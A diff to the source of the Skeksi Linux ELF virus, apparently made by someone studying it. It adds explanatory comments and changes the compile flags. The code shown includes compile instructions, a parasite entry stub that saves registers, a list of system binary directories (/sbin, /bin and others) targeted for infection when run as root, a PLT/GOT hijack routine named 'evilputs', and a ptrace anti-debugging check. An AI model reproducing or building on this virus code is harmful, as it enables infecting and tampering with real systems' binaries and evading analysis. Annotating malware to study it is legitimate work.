@@ -3,7 +3,7 @@
  * Written by ElfMaster - ryan@bitlackeys.org
  *
  * Compile:
- * gcc -g -O0 -DANTIDEBUG -DINFECT_PLTGOT  -fno-stack-protector -c virus.c -fpic -o virus.o
+ * gcc -g -O0 -D ANTIDEBUG -D INFECT_PLTGOT  -fno-stack-protector -c virus.c -fpic -o virus.o
  * gcc -N -fno-stack-protector -nostdlib virus.o -o virus
  *
  * Using -DDEBUG will allow Virus to print debug output
@@ -117,6 +117,7 @@ struct bootstrap_data {
 	char **argv;
 };
 
+// PER: Structure of the ELF executable
 typedef struct elfbin {
 	Elf64_Ehdr *ehdr;
 	Elf64_Phdr *phdr;
@@ -136,7 +137,7 @@ typedef struct elfbin {
 	int original_virus_exe;
 } elfbin_t;
 
-#define DIR_COUNT 4
+#define DIR_COUNT 4 //PER: Number of directories
 
 _start()
 {
@@ -147,6 +148,8 @@ _start()
 	 * Save register state before executing parasite
 	 * code.
 	 */
+	
+	//PER: saving the previous state of register in order to not hamper the host program
 	__ASM__ (
 	 ".globl real_start	\n"
  	 "real_start:		\n"
@@ -174,6 +177,7 @@ _start()
 	 * and call it.
 	 */
 	__ASM__ ( 
+		// PER: #if 0 will not be compiled nor executed
 #if 0
 	 "leaq %0, %%rdi\n"
 #endif
@@ -697,18 +701,27 @@ int check_criteria(char *filename)
 
 void do_main(struct bootstrap_data *bootstrap)
 {
-	Elf64_Ehdr *ehdr;
-	Elf64_Phdr *phdr;
-	Elf64_Shdr *shdr;
-	uint8_t *mem, *heap = NULL;
+	Elf64_Ehdr *ehdr; // PER: structure of elf header 
+	Elf64_Phdr *phdr; // PER: structure of program header
+	Elf64_Shdr *shdr; // PER: structure of section header
+	
+	uint8_t *mem, *heap = NULL; // PER: 8 bytes unsigned integer
+
 	long new_base, base_addr, evilputs_addr, evilputs_offset;
+
 	struct linux_dirent64 *d;
+	
 	int bpos, fcount, dd, nread;
+	
 	char *dir = NULL, **files, *fpath, dbuf[32768];
+	
 	struct stat st;
 	mode_t mode;
+
 	uint32_t rnum;
-	elfbin_t self, target;
+
+	elfbin_t self, target; // PER: ELF file of virus and target
+	
 	int scan_count = DIR_COUNT;
 	int icount = 0;
 	int paddingSize;
@@ -717,10 +730,10 @@ void do_main(struct bootstrap_data *bootstrap)
 	 * we can't use string literals because they will be
 	 * stored in either .rodata or .data sections.
 	 */
-	char *dirs[4] = {"/sbin", "/usr/sbin", "/bin", "/usr/bin" }; //by root
-	char cwd[2] = {'.', '\0'}; // by normal user
+	char *dirs[4] = {"/sbin", "/usr/sbin", "/bin", "/usr/bin" }; //by root PER: addresses of the directories to attack if the user of root
+	char cwd[2] = {'.', '\0'}; // PER: by normal user(non-root user)
 
-#if ANTIDEBUG
+#if ANTIDEBUG //PER: While compiling, -D ANTIDEBUG was used to enable this block
         if (_ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
                 _printf("!! Skeksi Virus, 2015 !!\n");
                 Exit(-1);
